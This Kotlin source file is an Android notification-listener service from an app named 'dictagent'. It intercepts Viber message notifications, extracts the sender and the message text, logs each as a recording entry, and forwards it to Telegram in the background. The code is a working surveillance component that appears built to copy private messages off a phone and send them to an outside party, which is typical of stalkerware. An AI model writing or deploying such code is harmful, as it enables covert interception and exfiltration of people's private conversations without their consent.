package com.valera.dictagent

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import java.util.concurrent.Executors

class ViberNotificationService : NotificationListenerService() {
    private val executor = Executors.newSingleThreadExecutor()

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        if (!Config.captureViber) return
        if (sbn.packageName != "com.viber.voip") return
        val extras = sbn.notification.extras
        val title = extras.getString("android.title") ?: ""
        val text = extras.getCharSequence("android.text")?.toString() ?: ""
        if (text.isBlank()) return
        val entry = RecordingEntry(
            type = "VIBER",
            timestamp = sbn.postTime,
            text = "$title: $text",
            contact = title,
            status = "SENDING"
        )
        RecordingStorage.save(applicationContext, entry)
        AppState.notifyUpdate(applicationContext)
        executor.submit { TelegramSender.sendText(applicationContext, entry) }
    }

    override fun onDestroy() {
        executor.shutdown()
        super.onDestroy()
    }
}
